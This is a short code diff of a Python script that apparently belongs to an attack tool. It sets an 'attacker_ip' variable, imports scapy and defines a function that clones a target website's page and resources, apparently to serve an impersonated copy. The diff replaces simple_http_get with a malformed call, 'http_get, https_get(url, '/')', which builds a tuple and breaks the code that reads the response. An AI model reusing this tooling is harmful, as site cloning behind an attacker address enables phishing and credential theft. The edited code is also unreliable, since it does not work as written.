@@ -6,7 +6,7 @@ from http.server import SimpleHTTPRequestHandler
 import socketserver
 from threading import Thread
 from scapy.all import *
-from requests_test import simple_http_get
+from requests_test import http_get, https_get
 
 # Configuration
 attacker_ip = "192.168.2.2"  # Replace with your actual IP address
@@ -18,7 +18,7 @@ def clone_website(url, save_dir):
     if not os.path.exists(save_dir):
         os.makedirs(save_dir)
 
-    response = simple_http_get(url, '/')
+    response = http_get, https_get(url, '/')
     soup = BeautifulSoup(response.text, 'html.parser')
 
     # Save the main page
@@ -34,7 +34,7 @@ def clone_website(url, save_dir):
             resource_path = os.path.join(save_dir, os.path.basename(urlparse(src_url).path))
             # Fetch and save resource
             try:
-                res = simple_http_get(src_url, '/')
+                res = http_get, https_get(src_url, '/')
                 with open(resource_path, 'wb') as res_file:
                     res_file.write(res.content)
                 print(f"Downloaded: {src_url}")
